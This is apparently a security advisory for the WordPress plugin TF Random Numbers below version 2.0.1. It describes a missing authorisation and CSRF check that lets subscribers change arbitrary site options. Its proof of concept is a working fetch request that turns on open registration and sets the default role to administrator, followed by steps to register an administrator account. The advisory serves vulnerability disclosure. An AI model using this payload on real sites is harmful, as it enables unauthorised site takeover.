## WordPress Plugin Vulnerabilities

# TF Random Numbers < 2.0.1 - Subscriber+ Arbitrary Option Update

### Description

The plugin does not have authorisation and CSRF check in an AJAX action, and does not ensure that the options to be updated belong to the plugin. As a result, it could allow any authenticated users, such as subscriber, to update arbitrary blog options, such as enabling registration and set the default role to administrator

### Proof of Concept

Sign in as a subscriber and run the following code in the web console
fetch( 'admin-ajax.php', { method: 'POST', headers:{'Content-Type': 'application/x-www-form-urlencoded'}, body: 'action=tf\_numb\_save\_licenses&data[addon\_0][key]=users\_can\_register&data[addon\_0][val]=1&data[addon\_1][key]=default\_role&data[addon\_1][val]=administrator' } );
Log out and register an account which will be an administrator one
